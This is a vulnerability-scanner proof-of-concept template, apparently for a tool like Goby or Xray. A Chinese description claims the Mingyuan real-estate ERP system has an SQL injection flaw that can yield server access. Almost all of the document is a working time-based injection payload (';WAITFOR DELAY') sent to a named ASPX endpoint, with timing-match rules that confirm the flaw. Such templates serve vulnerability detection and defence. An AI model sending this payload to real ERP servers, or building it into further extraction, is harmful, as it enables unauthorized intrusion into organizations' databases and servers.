漏洞描述:明源地产ERP系统具有丰富的房地产行业经验和定制化功能,可以适应不同企业的需求。该系统存在sql注入漏洞，可获取服务器权限

poc:
relative: req0 && req1
session: false
requests:
- method: GET
timeout: 13
path: /cgztbweb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAY%20'0:0:5'--&ywtype=GetParentProjectName
headers:
	User-Agent: Mozilla/5.0 (X11; Linux x86_64)AppleWebKit/537.36 (KHTML,likeGecko) Chrome/89.0.3119.54 Safari/537.36
follow_redirects: true
matches: (time.gt("5")&& time.lt("10"))
- method:GET
timeout: 10
path:/cgztbweb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAY%20'0:0:0'--&ywtype=GetParentProjectName
headers:
	User-Agent: Mozilla/5.0 (X11; Linux x86_64)AppleWebKit/537.36 (KHTML, likeGecko) Chrome/89.0.3119.54 Safari/537.36
follow_redirects: true
matches: time.It("5")
